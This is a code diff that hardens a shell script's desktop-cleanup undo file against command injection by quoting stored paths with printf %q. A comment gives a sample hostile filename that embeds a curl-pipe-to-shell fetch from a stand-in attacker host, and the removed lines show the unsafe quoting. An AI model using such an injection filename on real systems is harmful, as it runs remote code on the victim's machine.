@@ -329,8 +329,12 @@ action_clean() {
   mkdir -p "$target_path"
   
   # Save undo info
+  # This file is later sourced by `fc desktop undo`, and the paths below come
+  # from Desktop filenames — i.e. from anything a browser, AirDrop, or an
+  # unzipped archive dropped there. printf %q quotes them so a name like
+  # `report$(curl attacker.sh|sh).pdf` is stored as data, not as shell.
   echo "# Desktop cleanup $(date)" > "$UNDO_FILE"
-  echo "ARCHIVE_PATH=\"$target_path\"" >> "$UNDO_FILE"
+  printf 'ARCHIVE_PATH=%q\n' "$target_path" >> "$UNDO_FILE"
   echo "FILES=()" >> "$UNDO_FILE"
   
   # Move files
@@ -359,7 +363,7 @@ action_clean() {
     fi
     
     if mv "$item" "$dest" 2>/dev/null; then
-      echo "FILES+=(\"$dest\")" >> "$UNDO_FILE"
+      printf 'FILES+=(%q)\n' "$dest" >> "$UNDO_FILE"
       moved_count=$((moved_count + 1))
     else
       msg_warning "Failed to move: $basename"
